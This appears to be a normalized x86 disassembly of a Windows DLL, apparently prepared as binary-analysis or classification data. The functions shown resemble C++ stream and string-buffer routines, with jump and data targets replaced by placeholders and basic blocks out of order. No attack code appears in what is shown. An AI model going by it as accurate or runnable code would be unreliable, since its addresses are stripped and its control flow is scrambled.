lea eax [ edi + 0x38 ]
push eax
lea ecx [ esi + 0x38 ]
call sub_10001450
push 0xffffffff
push ebx
lea eax [ edi + 0x54 ]
push eax
lea ecx [ esi + 0x54 ]
call sub_10001450
lea eax [ edi + 0x70 ]
lea ecx [ esi + 0x70 ]
call sub_1000274f
push 0xffffffff
push ebx
lea eax [ edi + 0x88 ]
push eax
lea ecx [ esi + 0x88 ]
call sub_10001450
push 0xffffffff
push ebx
lea eax [ edi + 0xa4 ]
push eax
lea ecx [ esi + 0xa4 ]
call sub_10001450
push 0xffffffff
push ebx
lea eax [ edi + 0xc0 ]
push eax
lea ecx [ esi + 0xc0 ]
call sub_10001450
mov eax [ edi + 0xdc ]
mov [ esi + 0xdc ] eax
mov eax [ edi + 0xe0 ]
push 0xffffffff
mov [ esi + 0xe0 ] eax
mov eax [ edi + 0xe4 ]
push ebx
add edi 0xe8
push edi
lea ecx [ esi + 0xe8 ]
mov [ esi + 0xe4 ] eax
call sub_10001450
pop edi
mov eax esi
pop ebx
pop ecx
retn
sub_100024f0
push 0x8c
mov eax sub_1004f819
call sub_10028203
lea eax [ ebp - 0x98 ]
push eax
call sub_100028d7
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x98 ]
mov eax [ eax + 0x4 ]
lea eax [ ebp + eax - 0x98 ]
call sub_10003ee7
lea ecx [ ebp - 0x98 ]
lea eax [ esi + 0x38 ]
push ecx
call sub_1000557f
pop ecx
lea ecx [ ebp - 0x98 ]
lea eax [ esi + 0x54 ]
push ecx
call sub_1000557f
pop ecx
lea eax [ esi + 0x34 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
call sub_100055ca
lea ecx [ ebp - 0x98 ]
lea eax [ esi + 0x18 ]
push ecx
call sub_1000557f
lea eax [ ebp - 0x98 ]
add esp 0xc
push eax
mov eax esi
call sub_100055e3
pop ecx
lea ecx [ ebp - 0x98 ]
lea eax [ esi + 0x70 ]
push ecx
call sub_100055e3
pop ecx
lea ecx [ ebp - 0x98 ]
lea eax [ esi + 0x88 ]
push ecx
call sub_1000557f
pop ecx
lea ecx [ ebp - 0x98 ]
lea eax [ esi + 0xc0 ]
push ecx
call sub_1000557f
pop ecx
lea ecx [ ebp - 0x98 ]
lea eax [ esi + 0xa4 ]
push ecx
call sub_1000557f
pop ecx
lea eax [ esi + 0xdc ]
push eax
lea eax [ ebp - 0x98 ]
push eax
call sub_100055ca
lea eax [ esi + 0xe0 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
call sub_100055ca
lea eax [ esi + 0xe4 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
call sub_100055ca
lea ecx [ ebp - 0x98 ]
lea eax [ esi + 0xe8 ]
push ecx
call sub_1000557f
or [ ebp - 0x4 ] 0xffffffff
add esp 0x1c
lea eax [ ebp - 0x98 ]
call sub_1000219b
call sub_100282db
retn
sub_10002621
push 0x148
mov eax sub_1004f9aa
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov esi ecx
push 0x0
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x154 ] eax
mov edi edx
mov [ ebp - 0x14 ] 0xf
call sub_10002004
and [ ebp - 0x4 ] 0x0
push edi
lea edx [ ebp - 0x2c ]
mov ecx esi
call sub_10009332
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
pop ecx
jae r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x1
push ecx
push eax
lea ecx [ ebp - 0x48 ]
call sub_100026f9
lea eax [ ebp - 0x150 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100020aa
lea ecx [ ebp - 0x48 ]
lea esi [ ebp - 0x150 ]
mov [ ebp - 0x4 ] 0x2
call sub_100024f0
mov eax esi
mov esi [ ebp - 0x154 ]
call sub_10002426
lea edi [ ebp - 0x150 ]
call sub_1000211e
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10001500
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
call sub_100282ef
retn 0x4
lea eax [ ebp - 0x28 ]
sub_1000271f
push 0x0
mov eax sub_1004cbb1
call sub_10028203
mov esi [ ebp + 0x8 ]
push ecx
mov [ ebp + 0x8 ] esp
mov [ ebp + 0x8 ] esp
call sub_10001599
xor eax eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov eax esi
call sub_100282db
retn 0x4
sub_1000274f
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
mov esi eax
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x10 ]
sub eax ecx
push 0x1c
cdq
pop ecx
idiv ecx
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ edi + 0xc ]
sub eax ebx
push 0x1c
cdq
pop ecx
idiv ecx
mov ecx eax
cmp [ ebp - 0x4 ] ecx
ja r-xdata
mov ebx [ edi + 0x10 ]
lea esi [ ebp - 0x8 ]
call sub_10018308
mov ebx [ edi + 0xc ]
lea esi [ ebp - 0x10 ]
call sub_10018308
push [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push eax
push edi
call sub_10003152
jmp r-xdata
test ebx ebx
jne r-xdata
push [ esi + 0x10 ]
mov ecx [ esi + 0xc ]
mov eax ebx
call sub_10003293
pop ecx
push [ edi + 0x10 ]
call sub_10001728
mov eax [ esi + 0x10 ]
sub eax [ esi + 0xc ]
push 0x1c
cdq
pop ecx
idiv ecx
imul eax eax 0x1c
add eax [ edi + 0xc ]
jmp r-xdata
mov eax [ edi + 0x14 ]
sub eax ebx
push 0x1c
cdq
pop ebx
idiv ebx
xor eax eax
jmp r-xdata
mov [ edi + 0x10 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
imul ecx ecx 0x1c
add ecx edx
mov ebx ecx
push ebx
mov ecx edx
call sub_10003293
pop ecx
push [ edi + 0x10 ]
mov ecx ebx
jmp r-xdata
cmp [ ebp - 0x4 ] eax
mov eax [ edi + 0xc ]
ja r-xdata
mov eax [ esi + 0x10 ]
sub eax [ esi + 0xc ]
push 0x1c
cdq
pop ecx
idiv ecx
xor ecx ecx
mov [ edi + 0xc ] ecx
mov [ edi + 0x10 ] ecx
mov [ edi + 0x14 ] ecx
cmp eax ecx
je r-xdata
push [ edi + 0x10 ]
call sub_10001728
push [ edi + 0xc ]
call sub_100242e6
pop ecx
push [ esi + 0x10 ]
call sub_100032d1
call sub_1000154b
test al al
je r-xdata
push [ edi + 0xc ]
mov ecx [ esi + 0xc ]
sub_1000286f
push 0x8
mov eax sub_1004e4f0
call sub_10028203
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] r--data
mov [ esi + 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0xc ]
xor ebx ebx
push edi
inc ebx
push esi
mov [ ebp - 0x10 ] ebx
call sub_10002f42
mov [ ebp - 0x4 ] ebx
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push edi
mov [ esi + eax ] r--data
call sub_100030cd
and [ edi + 0x3c ] 0x0
and [ edi + 0x40 ] 0x0
mov [ edi ] r--data
mov eax esi
call sub_100282db
retn 0x4
sub_100028d7
push 0x8
mov eax sub_1004e4f0
call sub_10028203
mov ebx ecx
mov edi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov [ edi ] r--data
mov [ edi + 0x8 ] r--data
mov [ edi + 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
lea eax [ edi + 0xc ]
xor esi esi
push eax
inc esi
push edi
mov [ ebp - 0x10 ] esi
call sub_10002f42
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
mov eax [ eax + 0x4 ]
lea esi [ edi + 0xc ]
push esi
mov [ edi + eax ] r--data
mov [ ebp - 0x14 ] esi
call sub_100030cd
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
cmp [ ebx + 0x18 ] 0x8
mov eax [ ebx + 0x14 ]
jb r-xdata
add ebx 0x4
mov ebx [ ebx + 0x4 ]
jmp r-xdata
mov eax edi
call sub_100282db
retn 0x4
push ebx
call sub_100031aa
and [ esi + 0x3c ] 0x0
and [ esi + 0x40 ] 0x0
test eax eax
je r-xdata
sub_10002966
push 0x4
mov eax sub_1004cb73
call sub_10028203
mov [ ebp - 0x10 ] ecx
mov eax [ ecx - 0x54 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
lea esi [ ecx - 0x48 ]
mov ecx esi
call sub_100029df
mov ecx esi
call sub_100029b4
call sub_100282db
retn
sub_100029df
push esi
mov esi ecx
test [ esi + 0x40 ] 0x1
mov [ esi ] r--data
je r-xdata
mov ecx [ esi + 0x10 ]
xor eax eax
mov [ ecx ] eax
mov ecx [ esi + 0x20 ]
mov [ ecx ] eax
mov ecx [ esi + 0x30 ]
mov [ ecx ] eax
mov ecx [ esi + 0x14 ]
mov [ ecx ] eax
mov ecx [ esi + 0x24 ]
mov [ ecx ] eax
mov ecx [ esi + 0x34 ]
mov [ ecx ] eax
and [ esi + 0x40 ] 0xfffffffe
mov [ esi + 0x3c ] eax
mov ecx esi
pop esi
jmp sub_10003c7d
mov eax [ esi + 0x10 ]
push [ eax ]
call sub_100242e6
pop ecx
sub_10002a28
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
test [ esi + 0x40 ] 0x8
push edi
je r-xdata
mov bx [ ebp + 0x8 ]
mov eax 0xffff
cmp ax bx
jne r-xdata
mov ecx [ esi + 0x24 ]
mov eax [ ecx ]
test eax eax
je r-xdata
mov edx [ esi + 0x24 ]
mov edi [ edx ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ esi + 0x3c ]
cmp eax edx
jae r-xdata
test [ esi + 0x40 ] 0x2
je r-xdata
mov ecx [ esi + 0x34 ]
mov eax [ ecx ]
mov edx edi
lea eax [ edx + eax * 2 ]
cmp edx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov edi [ esi + 0x34 ]
mov edi [ edi ]
lea eax [ eax + edi * 2 ]
mov [ ecx ] edx
mov ecx [ esi + 0x34 ]
sub eax edx
sar eax 0x1
mov [ ecx ] eax
test edi edi
jne r-xdata
mov eax 0xffff
jmp r-xdata
dec [ ecx ]
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
lea eax [ ecx + 0x2 ]
mov [ esi ] eax
mov [ ecx ] bx
mov ax bx
jmp r-xdata
mov eax [ esi + 0x34 ]
mov ebx [ eax ]
mov eax [ esi + 0x10 ]
add ebx ebx
sub ebx [ eax ]
add ebx edi
sar ebx 0x1
xor ebx ebx
jmp r-xdata
test ecx ecx
jbe r-xdata
push 0x20
pop ecx
jmp r-xdata
mov ecx ebx
shr ecx 0x1
cmp ecx 0x20
jae r-xdata
je r-xdata
mov eax 0x7fffffff
sub eax ecx
cmp eax ebx
jae r-xdata
lea eax [ ecx + ebx ]
push 0x0
push eax
mov [ ebp - 0x4 ] eax
call sub_1000191e
mov edi eax
mov eax [ esi + 0x10 ]
mov edx [ eax ]
pop ecx
pop ecx
mov [ ebp - 0x8 ] edx
test ebx ebx
jbe r-xdata
test ecx ecx
shr ecx 0x1
jne r-xdata
jne r-xdata
push ebx
push edx
push [ ebp - 0x4 ]
push edi
call sub_10001b42
mov edx [ ebp - 0x8 ]
add esp 0x10
test ebx ebx
mov eax [ esi + 0x3c ]
sub eax edx
sar eax 0x1
lea eax [ edi + eax * 2 ]
mov [ esi + 0x3c ] eax
mov eax [ esi + 0x24 ]
mov eax [ eax ]
sub eax edx
sar eax 0x1
lea ecx [ edi + eax * 2 ]
mov eax [ esi + 0x14 ]
mov ebx [ eax ]
sub ebx edx
sar ebx 0x1
lea ebx [ edi + ebx * 2 ]
mov [ eax ] ebx
mov eax [ esi + 0x24 ]
mov [ eax ] ecx
mov eax [ ebp - 0x4 ]
add eax eax
sub eax ecx
mov ecx [ esi + 0x34 ]
add eax edi
sar eax 0x1
mov [ ecx ] eax
test [ esi + 0x40 ] 0x4
je r-xdata
mov eax [ esi + 0x14 ]
mov [ esi + 0x3c ] edi
mov [ eax ] edi
mov eax [ esi + 0x24 ]
mov [ eax ] edi
mov eax [ ebp - 0x4 ]
mov ecx [ esi + 0x34 ]
add eax eax
sar eax 0x1
mov [ ecx ] eax
mov eax [ esi + 0x10 ]
test [ esi + 0x40 ] 0x4
mov [ eax ] edi
mov eax [ esi + 0x20 ]
jne r-xdata
mov ecx [ esi + 0x20 ]
mov ecx [ ecx ]
mov eax [ esi + 0x24 ]
mov eax [ eax ]
mov ebx [ esi + 0x10 ]
sub ecx edx
sar ecx 0x1
lea ecx [ edi + ecx * 2 ]
sub eax ecx
mov [ ebx ] edi
mov edi [ esi + 0x20 ]
inc eax
mov [ edi ] ecx
mov ecx [ esi + 0x30 ]
inc eax
sar eax 0x1
mov [ ecx ] eax
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x20 ]
and [ eax ] 0x0
mov eax [ esi + 0x30 ]
sar edi 0x1
mov [ eax ] edi
jmp r-xdata
mov [ eax ] edi
mov eax [ esi + 0x30 ]
mov [ eax ] 0x1
jmp r-xdata
mov eax [ esi + 0x34 ]
or [ esi + 0x40 ] 0x1
dec [ eax ]
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
lea eax [ ecx + 0x2 ]
mov [ esi ] eax
mov ax [ ebp + 0x8 ]
mov [ ecx ] ax
push edx
call sub_100242e6
pop ecx
test [ esi + 0x40 ] 0x1
je r-xdata
sub_10002bfc
mov eax [ ecx + 0x20 ]
mov edx [ eax ]
push esi
mov eax 0xffff
test edx edx
je r-xdata
pop esi
retn 0x4
mov esi [ ecx + 0x10 ]
cmp edx [ esi ]
jbe r-xdata
mov si [ esp + 0x8 ]
push edi
mov edi eax
cmp di si
pop edi
je r-xdata
mov edx [ ecx + 0x30 ]
inc [ edx ]
mov edx [ ecx + 0x20 ]
add [ edx ] 0xfffffffe
cmp ax si
je r-xdata
cmp si [ edx - 0x2 ]
je r-xdata
xor eax eax
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ eax ] si
movzx eax si
jmp r-xdata
test [ ecx + 0x40 ] 0x2
jne r-xdata
sub_10002c4f
mov eax [ ecx + 0x20 ]
push edi
mov edi [ eax ]
test edi edi
jne r-xdata
mov edx [ ecx + 0x30 ]
push ebx
mov ebx [ edx ]
push esi
mov esi edi
lea ebx [ esi + ebx * 2 ]
cmp esi ebx
jae r-xdata
mov eax 0xffff
pop edi
retn
test [ ecx + 0x40 ] 0x4
jne r-xdata
mov ax [ edi ]
jmp r-xdata
mov eax 0xffff
mov esi [ ecx + 0x24 ]
mov esi [ esi ]
test esi esi
je r-xdata
pop esi
pop ebx
pop edi
retn
cmp esi edi
ja r-xdata
cmp [ ecx + 0x3c ] esi
jae r-xdata
cmp [ ecx + 0x3c ] edi
jbe r-xdata
mov esi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax esi
sar eax 0x1
mov [ edx ] eax
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov ax [ eax ]
jmp r-xdata
mov [ ecx + 0x3c ] esi
sub_10002cb3
push ebp
mov ebp esp
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
test [ ebp + 0x14 ] 0x1
push ebx
push esi
push edi
je r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test [ ebp + 0x14 ] 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov edi [ eax ]
test edi edi
je r-xdata
mov [ ecx + 0x3c ] eax
mov esi [ r--data ]
mov edx [ edx ]
test edx edx
je r-xdata
cmp [ ebp + 0x10 ] 0x2
mov edx [ r--data ]
jne r-xdata
cmp [ ebp + 0x10 ] 0x2
mov edi [ r--data ]
jne r-xdata
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
mov ebx [ ecx + 0x3c ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
mov ebx [ ecx + 0x3c ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
test [ ebp + 0x14 ] 0x2
jne r-xdata
mov eax [ ecx + 0x10 ]
sub ebx [ eax ]
mov esi [ ebp + 0xc ]
sar ebx 0x1
add esi ebx
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
mov esi edi
jne r-xdata
mov ebx edx
mov eax [ ecx + 0x10 ]
sub ebx [ eax ]
mov esi [ ebp + 0xc ]
sar ebx 0x1
add esi ebx
jmp r-xdata
mov esi [ ebp + 0xc ]
mov esi edx
jmp r-xdata
mov ebx edi
test esi esi
jl r-xdata
test esi esi
jl r-xdata
mov esi [ ebp + 0xc ]
mov esi edx
jmp r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
sar ebx 0x1
cmp esi ebx
jg r-xdata
mov esi edi
jmp r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
sar ebx 0x1
cmp esi ebx
jg r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor ecx ecx
mov [ eax ] esi
pop esi
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
pop ebp
retn 0x10
mov edx [ ecx + 0x30 ]
sub eax edi
sar eax 0x1
add eax esi
sub [ edx ] eax
mov edx [ ecx + 0x20 ]
add eax eax
add [ edx ] eax
test [ ebp + 0x14 ] 0x2
je r-xdata
sub eax edx
mov edx [ ecx + 0x34 ]
sar eax 0x1
add eax esi
sub [ edx ] eax
mov ecx [ ecx + 0x24 ]
add eax eax
add [ ecx ] eax
jmp r-xdata
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
mov ebx [ ecx + 0x34 ]
mov edi [ ecx + 0x20 ]
mov ebx [ ebx ]
mov edi [ edi ]
lea eax [ eax + ebx * 2 ]
mov [ edx ] edi
mov ecx [ ecx + 0x34 ]
sub eax edi
sar eax 0x1
mov [ ecx ] eax
jmp r-xdata
sub_10002dfd
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
push esi
lea esi [ edx + eax ]
mov eax [ ecx + 0x24 ]
mov edx [ eax ]
push edi
test edx edx
je r-xdata
mov edi [ r--data ]
cmp esi edi
je r-xdata
cmp [ ecx + 0x3c ] edx
jae r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
pop edi
mov [ eax ] esi
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop esi
pop ebp
retn 0x20
test [ ebp + 0x24 ] 0x1
push ebx
je r-xdata
mov [ ecx + 0x3c ] edx
test [ ebp + 0x24 ] 0x2
je r-xdata
mov edx [ ecx + 0x20 ]
mov edx [ edx ]
test edx edx
je r-xdata
mov esi edi
mov edx [ eax ]
test edx edx
je r-xdata
test esi esi
jl r-xdata
test esi esi
jl r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
sar ebx 0x1
cmp esi ebx
jg r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
sar ebx 0x1
cmp esi ebx
jg r-xdata
sub eax edx
mov edx [ ecx + 0x30 ]
sar eax 0x1
add eax esi
sub [ edx ] eax
mov edx [ ecx + 0x20 ]
add eax eax
add [ edx ] eax
test [ ebp + 0x24 ] 0x2
je r-xdata
sub eax edx
mov edx [ ecx + 0x34 ]
sar eax 0x1
add eax esi
sub [ edx ] eax
mov ecx [ ecx + 0x24 ]
add eax eax
add [ ecx ] eax
jmp r-xdata
pop ebx
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
mov ebx [ ecx + 0x34 ]
mov edi [ ecx + 0x20 ]
mov ebx [ ebx ]
mov edi [ edi ]
lea eax [ eax + ebx * 2 ]
mov [ edx ] edi
mov ecx [ ecx + 0x34 ]
sub eax edi
sar eax 0x1
mov [ ecx ] eax
jmp r-xdata
sub_10002ef5
push esi
push edi
lea edi [ ecx - 0xc ]
lea esi [ edi + 0xc ]
mov ecx esi
call sub_100029b4
push esi
mov [ esi ] r--data
call sub_10023026
test [ esp + 0x10 ] 0x1
pop ecx
je r-xdata
mov eax edi
pop edi
pop esi
retn 0x4
push edi
call sub_100242e6
pop ecx
sub_10002f42
push 0x4
mov eax sub_1004e4a6
call sub_10028203
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
push esi
call sub_1000303f
mov eax [ esi + 0x8 ]
mov eax [ eax + 0x4 ]
mov [ esi + eax + 0x8 ] r--data
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax esi
call sub_100282db
retn 0x8
sub_10002f82
push 0x40
mov eax sub_1004d060
call sub_1002826c
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x40 ]
xor edi edi
mov [ ebp - 0x4c ] edi
test dl 0x2
jne r-xdata
test dl 0x4
jne r-xdata
mov ecx [ eax + 0x24 ]
cmp [ ecx ] edi
je r-xdata
push edi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x30 ] 0x7
call sub_100016a9
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
mov [ ebp - 0x4 ] 0x2
call sub_1000136c
lea ecx [ ebp - 0x48 ]
mov ecx [ eax + 0x20 ]
cmp [ ecx ] edi
je r-xdata
mov ecx [ ecx ]
mov edx [ eax + 0x3c ]
cmp edx ecx
jb r-xdata
mov edx [ eax + 0x30 ]
mov ecx [ ecx ]
mov edx [ edx ]
mov eax [ eax + 0x10 ]
mov eax [ eax ]
lea ecx [ ecx + edx * 2 ]
sub ecx eax
sar ecx 0x1
push ecx
push eax
lea ecx [ ebp - 0x2c ]
call sub_100026f9
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax [ eax + 0x14 ]
mov eax [ eax ]
sub ecx eax
sar ecx 0x1
push ecx
push eax
lea ecx [ ebp - 0x2c ]
call sub_100026f9
mov [ ebp - 0x4 ] edi
mov ecx edx
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_1000136c
lea ecx [ ebp - 0x2c ]
jmp r-xdata
push edi
push 0x1
call sub_10001500
mov eax ebx
call sub_100282ef
retn 0x4
sub_1000303f
push 0xc
mov eax sub_1004e480
call sub_10028203
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ edi + eax ] r--data
mov eax [ edi ]
mov [ edi + 0x4 ] ebx
mov esi [ eax + 0x4 ]
add esi edi
call sub_10003a0e
mov eax [ ebp + 0xc ]
mov [ esi + 0x28 ] eax
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ esi + 0x2c ] ebx
call sub_10003446
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10003950
pop ecx
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] bl
call sub_10003c49
mov ecx [ ebp - 0x10 ]
mov eax [ ecx ]
push 0x20
call [ eax + 0x28 ]
mov [ esi + 0x30 ] ax
cmp [ esi + 0x28 ] ebx
jne r-xdata
mov [ esi + 0x4 ] ebx
mov eax edi
call sub_100282db
retn 0x8
mov eax [ esi + 0x8 ]
or eax 0x4
push ebx
push esi
mov ecx eax
call sub_10003dcd
sub_100030cd
push 0x0
mov eax sub_1004cb27
call sub_10028203
mov esi [ ebp + 0x8 ]
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_100230fb
xor edi edi
push 0x4
mov [ ebp - 0x4 ] edi
call sub_10024389
pop ecx
cmp eax edi
je r-xdata
xor eax eax
mov ecx eax
call sub_10003a7e
jmp r-xdata
mov [ esi + 0x38 ] eax
lea ecx [ esi + 0x18 ]
mov [ esi + 0x20 ] ecx
lea ecx [ esi + 0x1c ]
mov [ esi + 0x24 ] ecx
lea eax [ esi + 0x8 ]
mov [ esi + 0x10 ] eax
lea ecx [ esi + 0x28 ]
mov [ esi + 0x30 ] ecx
lea eax [ esi + 0xc ]
mov [ esi + 0x14 ] eax
lea ecx [ esi + 0x2c ]
mov [ esi + 0x34 ] ecx
mov [ eax ] edi
mov eax [ esi + 0x24 ]
mov [ eax ] edi
mov eax [ esi + 0x34 ]
mov [ eax ] edi
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x20 ]
mov [ eax ] edi
mov eax [ esi + 0x30 ]
mov [ eax ] edi
mov eax esi
call sub_100282db
retn 0x4
sub_10003152
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
call sub_10018308
mov ebx [ ebp + 0x1c ]
lea esi [ ebp - 0x8 ]
call sub_10018308
mov edi esi
mov esi [ ebp + 0xc ]
call sub_1000323a
test al al
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
leave
retn 0x18
mov edi [ ebp + 0x8 ]
push [ edi + 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ ebp - 0x4 ]
call sub_10003293
pop ecx
push [ edi + 0x10 ]
mov ebx eax
call sub_10001728
mov [ edi + 0x10 ] ebx
sub_100031aa
push ebx
mov ebx eax
mov eax [ esi + 0x40 ]
and eax 0x6
cmp al 0x6
je r-xdata
pop ebx
retn 0x4
push edi
push 0x0
push ebx
call sub_1000191e
push ebx
push [ esp + 0x18 ]
mov edi eax
push ebx
push edi
call sub_10001b42
lea eax [ ebx + ebx ]
add esp 0x18
test [ esi + 0x40 ] 0x4
lea ecx [ eax + edi ]
mov [ esi + 0x3c ] ecx
jne r-xdata
mov edx [ esi + 0x40 ]
test dl 0x2
jne r-xdata
mov edx [ esi + 0x10 ]
mov [ edx ] edi
mov edx [ esi + 0x20 ]
mov [ edx ] edi
mov ebx [ esi + 0x30 ]
mov edx eax
sar edx 0x1
mov [ ebx ] edx
or [ esi + 0x40 ] 0x1
pop edi
test dl 0x10
jne r-xdata
mov edx [ esi + 0x14 ]
mov [ edx ] edi
mov edx [ esi + 0x24 ]
sub eax ecx
mov [ edx ] ecx
mov ecx [ esi + 0x34 ]
add eax edi
sar eax 0x1
mov [ ecx ] eax
mov eax [ esi + 0x20 ]
cmp [ eax ] 0x0
jne r-xdata
mov ecx edi
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x20 ]
and [ eax ] 0x0
mov eax [ esi + 0x30 ]
sar edi 0x1
mov [ eax ] edi
sub_10003270
cmp [ eax + 0x18 ] 0x8
mov edx [ eax + 0x14 ]
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push edx
push eax
push [ ecx + 0x14 ]
push 0x0
call sub_100033c9
neg eax
sbb eax eax
inc eax
retn
sub_10003293
push ebx
push esi
mov ebx eax
mov eax [ esp + 0xc ]
push edi
mov edi ecx
sub eax edi
push 0x1c
cdq
pop ecx
idiv ecx
mov esi eax
imul esi esi 0x1c
add esi ebx
cmp edi [ esp + 0x10 ]
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
retn
sub ebx edi
push 0xffffffff
push 0x0
push edi
lea ecx [ ebx + edi ]
call sub_10001450
add edi 0x1c
cmp edi [ esp + 0x10 ]
jne r-xdata
sub_100032d1
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000196b
add esp 0x10
pop edi
leave
retn 0x8
sub_100032f5
push 0x4
mov eax sub_1004c9fe
call sub_10028236
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_10024389
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_100282db
retn 0x4
sub_10003352
mov eax [ edi ]
test eax eax
jne r-xdata
mov edx [ eax ]
jmp r-xdata
call sub_10024832
mov eax [ edi ]
test eax eax
je r-xdata
mov ecx [ edi + 0x4 ]
push esi
mov esi [ esp + 0x8 ]
imul esi esi 0x1c
add ecx esi
cmp ecx [ edx + 0x10 ]
ja r-xdata
xor edx edx
call sub_10024832
test eax eax
je r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
add [ edi + 0x4 ] esi
mov eax edi
pop esi
retn 0x4
cmp ecx [ eax + 0xc ]
jae r-xdata
sub_10003398
cmp [ esp + 0xc ] 0x0
jbe r-xdata
xor eax eax
retn
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
movzx eax [ eax ]
cmp ax [ ecx ]
sbb eax eax
and eax 0xfffffffe
inc eax
retn
inc eax
inc eax
inc ecx
inc ecx
dec [ esp + 0xc ]
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
sub_100033c9
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
